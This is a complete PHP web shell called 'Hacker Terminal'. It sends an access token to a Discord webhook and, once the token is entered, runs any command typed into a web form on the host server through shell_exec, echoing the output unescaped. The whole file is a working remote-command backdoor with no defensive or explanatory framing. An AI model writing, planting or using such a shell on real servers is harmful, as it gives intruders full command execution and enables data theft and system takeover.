<?php
session_start();

// Discord Webhook URL (replace with your actual webhook URL)
define('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN');

// Function to send a message to Discord
function sendToDiscord($message) {
    $data = ['content' => $message];
    $options = [
        'http' => [
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
        ],
    ];
    $context = stream_context_create($options);
    file_get_contents(DISCORD_WEBHOOK_URL, false, $context);
}

// Generate a random token
function generateToken() {
    return bin2hex(random_bytes(8)); // Generates a 16-character token
}

// Check if the user is authenticated
if (!isset($_SESSION['authenticated'])) {
    $_SESSION['authenticated'] = false;
}

// Handle authentication
if (isset($_POST['auth_token'])) {
    if ($_POST['auth_token'] === $_SESSION['auth_token']) {
        $_SESSION['authenticated'] = true;
        $output = "<div class='output'>Authentication successful! You now have access to the terminal.</div>";
    } else {
        $output = "<div class='error'>Invalid token. Please try again.</div>";
    }
}

// If not authenticated, generate and send a token
if (!$_SESSION['authenticated']) {
    if (!isset($_SESSION['auth_token'])) {
        $token = generateToken();
        $_SESSION['auth_token'] = $token;
        sendToDiscord("Your authentication token is: $token");
    }
    $output = "<div class='output'>A token has been sent to the Discord channel. Enter it below to authenticate.</div>";
}

// Initialize the current directory in the session
if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd(); // Default to the current working directory
}

// Command Execution (only if authenticated)
if ($_SESSION['authenticated'] && isset($_POST['cmd'])) {
    $commands = explode(';', $_POST['cmd']);
    foreach ($commands as $cmd) {
        $cmd = trim($cmd);
        if (!empty($cmd)) {
            // Handle 'cd' command
            if (strpos($cmd, 'cd ') === 0) {
                $dir = trim(substr($cmd, 3));
                if ($dir === '/') {
                    $_SESSION['current_dir'] = '/'; // Change to root directory
                } elseif ($dir === '..') {
                    $_SESSION['current_dir'] = dirname($_SESSION['current_dir']); // Move up one directory
                } else {
                    // Handle absolute and relative paths
                    if (substr($dir, 0, 1) === '/') {
                        // Absolute path
                        $new_dir = $dir;
                    } else {
                        // Relative path
                        $new_dir = $_SESSION['current_dir'] . '/' . $dir;
                    }
                    if (is_dir($new_dir)) {
                        $_SESSION['current_dir'] = realpath($new_dir); // Change to the new directory
                    } else {
                        $output = "<div class='error'>Directory not found: $new_dir</div>";
                        continue;
                    }
                }
                $output = "<div class='output'>Changed directory to: {$_SESSION['current_dir']}</div>";
            } else {
                // Execute other commands in the current directory
                chdir($_SESSION['current_dir']); // Change to the tracked directory
                $command_output = shell_exec($cmd . ' 2>&1');
                if ($command_output === null) {
                    $output = "<div class='error'>Error executing command: $cmd</div>";
                } else {
                    $output = "<div class='output'>$ {$cmd}:\n\n$command_output\n</div>";
                }
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker Terminal</title>
    <style>
        /* General Styles */
        body {
            background-color: black;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* Terminal Container */
        #terminal {
            flex-grow: 1;
            padding: 20px;
            overflow-y: auto;
            white-space: pre-wrap;
            font-size: 14px;
            background-color: rgba(0, 0, 0, 0.9);
            border: 1px solid #00ff00;
            margin: 20px;
            box-shadow: 0 0 10px #00ff00;
        }

        /* Centered "Terminal" Text */
        #terminal-header {
            text-align: center;
            font-size: 36px;
            font-weight: bold;
            margin-top: 20px;
            margin-bottom: 20px;
            color: #00ff00;
        }

        /* Input Container */
        #input-container {
            padding: 20px;
            background-color: #111;
            display: flex;
            gap: 10px;
            align-items: center;
            border-top: 1px solid #00ff00;
        }

        /* Input Field */
        #input {
            background-color: transparent;
            color: #00ff00;
            border: none;
            padding: 10px;
            width: 100%;
            font-family: 'Courier New', Courier, monospace;
            font-size: 14px;
            outline: none;
            caret-color: #00ff00;
        }

        /* Blinking Cursor */
        #input::placeholder {
            color: #00ff00;
            opacity: 0.5;
        }

        /* Button Style */
        button {
            background-color: #00ff00;
            color: black;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: 'Courier New', Courier, monospace;
            font-size: 14px;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #00cc00;
        }

        /* Output Styles */
        .output {
            color: #00ff00;
        }

        .error {
            color: #ff0000;
        }

        /* Glow Effect for Terminal */
        @keyframes glow {
            0% { box-shadow: 0 0 10px #00ff00; }
            50% { box-shadow: 0 0 20px #00ff00; }
            100% { box-shadow: 0 0 10px #00ff00; }
        }

        #terminal {
            animation: glow 3s infinite;
        }

        /* Matrix Rain Effect (Optional) */
        #matrix {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.1;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Optional Matrix Rain Effect -->
    <canvas id="matrix"></canvas>

    <!-- Terminal Output -->
    <div id="terminal">
        <!-- Centered "Terminal" Text -->
        <div id="terminal-header">Terminal</div>
        <?php
        // Output any messages (e.g., authentication status, command output)
        if (isset($output)) {
            echo $output;
        }
        ?>
    </div>

    <!-- Input Container -->
    <div id="input-container">
        <?php if (!$_SESSION['authenticated']): ?>
            <!-- Authentication Form -->
            <form method="post" action="" style="flex-grow: 1;">
                <input id="input" type="text" name="auth_token" autofocus autocomplete="off" placeholder="Enter authentication token...">
                <button type="submit">Authenticate</button>
            </form>
        <?php else: ?>
            <!-- Command Input Form -->
            <form method="post" action="" style="flex-grow: 1;">
                <input id="input" type="text" name="cmd" autofocus autocomplete="on" placeholder="Enter command...">
                <button type="submit">Execute</button>
            </form>
        <?php endif; ?>
    </div>

    <!-- Matrix Rain Script -->
    <script>
        // Matrix Rain Effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        const columns = Math.floor(canvas.width / 20);
        const drops = Array(columns).fill(1);

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff00';
            ctx.font = '15px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = characters[Math.floor(Math.random() * characters.length)];
                ctx.fillText(text, i * 20, drops[i] * 20);
                if (drops[i] * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }

        setInterval(drawMatrix, 50);
    </script>
</body>
</html>
